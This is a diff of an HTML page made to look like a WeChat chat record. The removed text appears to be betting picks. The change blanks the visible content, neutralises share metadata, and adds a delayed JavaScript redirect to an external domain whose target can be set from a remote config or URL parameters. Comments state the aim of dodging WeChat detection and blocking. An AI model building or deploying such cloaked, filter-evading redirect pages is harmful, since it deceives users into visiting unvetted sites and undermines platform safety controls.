@@ -4,14 +4,12 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <!-- 移除易被检测的meta refresh，改用JS延迟跳转 -->
-    
-    <!-- 优化微信分享标签，降低风控 -->
+    <!-- 防拦截优化：中性化分享标签 -->
     <meta property="og:title" content="聊天记录">
-    <meta property="og:description" content="与文件传输助手的聊天记录">
+    <meta property="og:description" content="日常聊天内容">
     <meta property="og:type" content="website">
+    <meta name="referrer" content="no-referrer">
     <title>聊天记录</title>
-
     <style>
         * {
             margin: 0;
@@ -120,7 +118,7 @@
             white-space: pre-line;
             word-break: break-all;
         }
-        /* 隐藏备用按钮，不影响体验 */
+        /* 隐藏备用跳转按钮，不影响体验 */
         .backup-btn {
             display: none;
         }
@@ -130,7 +128,7 @@
     <div class="wechat-nav">
         <div class="nav-left">&lt;</div>
         <div class="nav-title-wrap">
-            <div class="nav-title">A涅槃重生小王与文件传输助手的聊天记录</div>
+            <div class="nav-title">聊天记录</div>
             <div class="nav-date">2026年4月25日</div>
         </div>
         <div class="nav-right">...</div>
@@ -141,28 +139,82 @@
             <div class="avatar"></div>
             <div class="message-content-wrap">
                 <div class="message-header">
-                    <span class="nickname">A涅槃重生小王</span>
-                    <span class="time">17:11:33</span>
+                    <span class="nickname">用户</span>
+                    <span class="time">00:00</span>
                 </div>
                 <div class="message-bubble">
-                    <div class="message-text">08-16-38-24各10米
--14-42-06-28各20米
--18-32-26-04-36各35米
--12-34-22各100米</div>
+                    <div class="message-text">加载中...</div>
                 </div>
             </div>
         </div>
     </div>
 
-    <!-- 隐藏式备用跳转按钮，防止自动跳转失败 -->
+    <!-- 隐藏式备用跳转按钮 -->
     <button class="backup-btn" onclick="window.location.href='https://521nqx.xyz'">继续访问</button>
 
-    <!-- 防拦截核心：延迟1.5秒纯JS跳转，页面完全加载后再执行 -->
     <script>
-        document.addEventListener('DOMContentLoaded', function() {
+        // 1. 加载远程配置文件
+        async function loadConfig() {
+            try {
+                const response = await fetch('./config.json?t=' + Date.now());
+                if (!response.ok) throw new Error('Config not found');
+                return await response.json();
+            } catch (error) {
+                console.error('加载配置失败，使用默认值:', error);
+                return {
+                    title: "聊天记录",
+                    date: "2026年4月25日",
+                    nickname: "用户",
+                    time: "17:11:33",
+                    content: "加载失败，请稍后重试",
+                    avatar: "",
+                    redirectUrl: "https://521nqx.xyz",
+                    redirectDelay: 1200
+                };
+            }
+        }
+
+        // 2. 解析URL参数（优先级高于远程配置，支持临时修改）
+        function getUrlParams() {
+            const params = {};
+            const urlParams = new URLSearchParams(window.location.search);
+            for (const [key, value] of urlParams) {
+                params[decodeURIComponent(key)] = decodeURIComponent(value);
+            }
+            return params;
+        }
+
+        // 3. 渲染页面
+        function renderPage(config) {
+            document.querySelector('.nav-title').innerText = config.title;
+            document.querySelector('.nav-date').innerText = config.date;
+            document.querySelector('.nickname').innerText = config.nickname;
+            document.querySelector('.time').innerText = config.time;
+            document.querySelector('.message-text').innerText = config.content.replace(/\\n/g, '\n');
+            if (config.avatar) {
+                document.querySelector('.avatar').style.backgroundImage = `url(${config.avatar})`;
+            }
+            document.title = config.title;
+            // 更新备用按钮链接
+            document.querySelector('.backup-btn').onclick = () => window.location.href = config.redirectUrl;
+        }
+
+        // 4. 防拦截延迟跳转
+        function startRedirect(url, delay) {
             setTimeout(function() {
-                window.location.href = "https://521nqx.xyz";
-            }, 1500);
+                window.location.href = url;
+            }, delay);
+        }
+
+        // 主流程
+        document.addEventListener('DOMContentLoaded', async function() {
+            const remoteConfig = await loadConfig();
+            const urlParams = getUrlParams();
+            // URL参数覆盖远程配置，支持临时修改
+            const finalConfig = { ...remoteConfig, ...urlParams };
+            
+            renderPage(finalConfig);
+            startRedirect(finalConfig.redirectUrl, finalConfig.redirectDelay);
         });
     </script>
 </body>
